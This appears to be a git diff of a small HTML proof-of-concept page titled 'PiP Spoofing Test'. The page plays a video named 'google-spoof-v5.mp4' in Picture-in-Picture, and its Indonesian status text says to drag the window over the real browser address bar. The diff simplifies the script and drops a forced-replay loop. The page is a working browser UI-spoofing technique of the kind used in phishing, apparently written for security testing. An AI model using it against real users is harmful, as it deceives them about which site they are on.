@@ -7,6 +7,8 @@
 </head>
 <body style="font-family: sans-serif; padding: 40px; background: #ffffff;">
   <h1>PiP Spoofing Test</h1>
+
+  
   <video id="v" autoplay muted playsinline loop src="https://0x403for.github.io/google-spoof-v5.mp4" style="width: 100%;"></video>
   <br><br>
   <button onclick="pip()" style="font-size: 20px; padding: 15px 30px;">Buka PiP</button>
@@ -14,21 +16,14 @@
 
   <script>
     var v = document.getElementById('v');
-    v.addEventListener('pause', function(){
-      setTimeout(function(){ v.play().catch(function(){}); }, 100);
-    });
-    setInterval(function(){
-      if(v.paused){ v.play().catch(function(){}); }
-    }, 500);
 
-    async function pip(){
-      try{
-        await v.play();
-        await v.requestPictureInPicture();
-        document.getElementById('o').innerText = 'PiP opened. Geser ke atas sampe nutupin address bar asli.';
-      }catch(e){
+    function pip(){
+      
+      v.requestPictureInPicture().then(function(){
+        document.getElementById('o').innerText = 'PiP opened. Geser ke atas sampe nutupin address bar asli. Jangan di-tap, cukup digeser.';
+      }).catch(function(e){
         document.getElementById('o').innerText = 'Blocked: ' + e;
-      }
+      });
     }
   </script>
 </body>
